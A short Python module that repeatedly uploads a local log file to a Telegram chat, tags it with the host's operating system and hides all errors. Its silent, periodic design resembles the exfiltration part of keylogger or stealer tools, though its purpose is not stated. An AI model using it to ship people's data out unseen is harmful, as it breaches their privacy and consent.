import os
import asyncio
import platform
from telegram import Bot

class TelegramBot:
    def __init__(self, bot_token, chat_id, log_file, send_interval):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log_file = log_file
        self.send_interval = send_interval
    
    async def _send_log_to_telegram(self):
        if not os.path.exists(self.log_file):
            return
        
        try:
            bot = Bot(token=self.bot_token)
            
            with open(self.log_file, 'rb') as file:
                await bot.send_document(
                    chat_id=self.chat_id,
                    document=file,
                    caption=f"Log file - {platform.system()}"
                )
            
        except Exception as e:
            pass
    
    async def _telegram_scheduler(self):
        while True:
            await asyncio.sleep(self.send_interval)
            await self._send_log_to_telegram()
    
    def run(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._telegram_scheduler())
